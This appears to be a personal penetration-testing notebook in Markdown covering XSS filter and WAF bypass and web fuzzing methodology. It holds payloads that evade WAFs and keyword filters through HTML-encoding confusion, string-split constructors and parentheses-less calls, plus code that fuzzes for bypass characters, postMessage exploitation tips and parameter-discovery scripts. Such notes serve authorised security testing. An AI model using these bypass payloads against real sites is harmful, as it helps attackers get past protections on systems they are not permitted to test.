# XSS
- 80% of time spent in **debugger** 
- what the browser shows in inspect is after all the decoding and permutations 
- how to find the event handlers (best way):
```js
Object.keys(window).filter(k => !k.indexOf('on'))
```
- do *more* DOM + postMessage 
	- first look for these:
		- *window.open*
		- *window.location*
		- *window.location.href*
# **FUZZ the whitespaces allowed** 
- [ ] (re read js for hackers)
- FUZZ for *HTML tags*
	- <img{fuzz}>src{fuzz}onerror=test
```js
const div = document.createElement('div'); const result = [];
const worked = p => result.push(p); for (let i=0;i<=0x10ffff; ++i)
{ div.innerHTML = `<img${String.fromCodePoint(i)}src${String.fromCodePoint(i)}onerror=worked(${i})>` } document.body.appendChild(div);
```
- FUZZ for *JS scheme*
	- javascript{FUZZ} also java{FUZZ}script 
		- (%0a, %0d,%09) (you must know)
	- {FUZZ}javascript ...
```js
log=[]; let anchor =document.createElement('a'); for(let i=0;i<0x10ffff; i++){ anchor.href = `javascript${String.fromCodePoint(i)};`; if (anchor.protocol === 'javascript:'){ log.push(i) } }
```
# **bypass**
- [ ] known waf ? -> search the net 
- [ ] CDN or application based ? -> build your own payload
- [ ] JS protection ? -> debug
- Do not use noisy Strings  
	- `<x> -> <x onxxx -> <x onxxx= `
### in HTML tags
- [ ] fuzz to find a valid tag
- [ ] *<ta[FUZZ]g> (it will gets valid server side)* #gold (***change after ruleset is a killer***)
- [ ] waf confusion 
	- [ ] *use HTML encoding* #gold
		- [ ] `<img src onerror=alert(1)` -> 403
		- [ ] `<img src>` -> 200
		- [ ] `<img src> onerror=alert(1)` -> 200
		- [ ] `<img src &#x3E onerror=alert(1)>` -> 200
```js
<!--` <img/src` onerror=alert(origin)> --!>
<img src="/" =_='' title="onerror='prompt(origin)'" >
<!<script>confirm(origin)</script>
```
### in JS execution
##### alert,prompt,etc (WORDS) are filtered ? 
- [ ] confuse
```js
- [](`cons`+`tructor`)(`const`+`ructor`)(`aler`+`t(origin)`)()
```
- [ ] payload in fragment part
```js
  location=location.hash.split('#')(1) // #javascript:alert(origin)
```
- [ ] unicode encode the js syntax
	- [ ] \u{0061}
	- [ ] \u{000000000000000000000061}
##### paranthesis,brackets,func() etc are filtered?
- [ ] **alert?.(origin)** -> use `?`
- [ ] window.valueOf=alert;window+1 -> **parentheses-less payloads**

### PostMessage
- doesn't generate http req => burp doesn't capture 
- search for EventListeners 
- Chrome (not burp's)
- important properties 
	- e.source ->  *we cannot forge* 
	- e.origin -> *we cannot forge* 
	  (`e.origin === 'https://google.com'` is not vulnerable)
	- e.data
- **EXPLOIT**: `postmessage developer tool` + `DOM invader` (post message interception)
	- post your message + **Spoof Origin**  + **build POC** 
		- ==window.open (opens pop-up)==
		- iframe ALWAYS GETS DENIED
	- dom invader gets refreshed everytime, `postmessage developer tool` doesnt
	- dom invader doesnt detect listeners in app
	- BUT *if a message sent dominvader captures it* + you must test messages for each listener manually (source code)
	  - ==best way to trace== ? => search for unique string and debug in debugger

#TODO 
- [**Waf Evasion Techniques**](https://blog.isec.pl/waf-evasion-techniques/)
- [An Interesting XSS-Bypassing WAF](https://labs.cognisys.group/posts/An-Intresting-XSS-Bypassing-WAF/)


# FUZZing
- sanding maformed|unexpected HTTP reqs
- to trigger unexpected behavior
- to discover hidden|unlinked  resources 
	- files
	- parameter
	- header
- you should balance the fuzzing condition
- ===***FOLLOW the LEAST CHANGE principle***=== (no kermanshaahi hack :)
### hidden resources
- unlinked directories|files
- development|testing environments
- API endpoints
- config files
### tools 
- FFUF
- ***[recollapse](https://github.com/0xacb/recollapse)***
- crunch
- hand
- GAP
	- use value replacement -> observe interesting behavior(reflection|change|malfunction) -> *reduce* and change values to exploit 
- fallparams 
	- discover parameters at first and filterout (leach:) 
- x8 | Arjun
- paramMiner
	- mess with the configs -> goes to target tree 
	- its wordlist is goated
- IIS shortname scanner
### checking phase
- ===**check the reliability of fuzzing**===
	- find a ***hook*** (static files are better)
	- verify the fuzzing by the hook (my pov: *dont use automatic filtering*)
- repeat  
-  testing your hook: 
```bash
wList_maker() {
    seq 1 100 > list.tmp
    echo $1 >> list.tmp
    seq 101 300 >> list.tmp
    echo $1 >> list.tmp
    seq 301 600 >> list.tmp
} #you MUST filter out all then find your hook when fuzzing -> -mc all -fs [something] => Now thats a good FUZZ
```
### inputs
- WAF, **checker function**, restriction, validation, etc bypass
- use *[recollapse](https://github.com/0xacb/recollapse)*
- Ranges 
	- 0x00, 0x2F
	- 0x3A, 0x40
	- 0x5B, 0x60
### files
1. recognize the *Web Server architecture*
2. recognize the *filename patterns*
	- login.php
	- loginUser.php
	- LoginUser.php
	- user_count.php => FUZZlowercase_ FUZZlowercase.php
3. FUZZ for JS files
4. FUZZ on status codes
### endpoints
- => function()
- Flask, Rails,Express,etc are route-based
- use Ffuf for normal fuzzing *partially* 
-  `/api/users/all`
	- `/api/users/FUZZ`
	- `/api/FUZZ/all`
	- `/api/FUZZ`  
- again ... you MUST use a hook
- **FOLLOW THE LEAST CHANGE PRINCIPLE**
### parameters
- query string parameters can be increased, as long as the server handles the request (in average 25 -> 40 params)
- the number of parameters included in each HTTP request is called a ***chunk***
	- smaller chunk => improves discovery
- fuzz on various *status codes* (including 404 -> web application)
- fuzzing *headers is similar to fuzzing parameters*, nothing special
- fuzz with both *GET and POST* HTTP methods
#### magic parameters
- every web app has hidden parameters
	- Findable in web app
	- *similar to other parameter names*
		- yahoo_home_url -> yahoo_home_redirect
		- use_local_engine -> reflects into engine json object
			- ? -> frontend json object
			- use_FUZZ_engine -> use_remote_engine
	- totally new
- ==**programmers use the same parameter names on different pages**==
	- (e.g all params -> unfurl (extract params) -> use elsewhere)
- **where**? 
	- all HTTP req parameters
	- HTML form names + ids + etc
	- JS variable names
	- JSON object in js files
- example ? 
	- (passive (waymore + paramSpider)(`inurl:? || inurl:&`) + active (manually like GAP + automated like x8 + fallparams))
	-  (e.g manual GAP -> replace values -> interesting behavior | e.g automated x8)
	- *MANUALL is ALWASY BETTER* (false positive)
```bash
param_maker() {
    filename="$1"
    value="$2"
    counter=0
    query_string=""

    while IFS= read -r keyword
    do
        if [ -n "$keyword" ]
        then
            counter=$((counter+1))
            query_string="${query_string}${keyword}=${value}${counter}&"
        fi

        if [ $counter -eq 25 ]
        then
            echo "${query_string%?}"
            query_string=""
            counter=0
        fi
    done < "$filename"

    if [ $counter -gt 0 ]
    then
        echo "${query_string%?}"
    fi
}
```
### wordlist
- generic ->
   best: assetnote's **[wordlist_with_underscore.txt](https://wordlists-cdn.assetnote.io/data/manual/wordlist_with_underscores.txt)** 
   then paramminer
- make you own 
	- 3(.-_ included) & 4 alphanumeric ->  crunch
	- ASCII characters are good to fuzz
	- **PATERNS** again
	- gather wordlists by Hand

### over CDN 
- lower your threads + delay
- capture by burp => add the corresponding headers
- proxy through burp + turn on HTTP2  
# Authentication
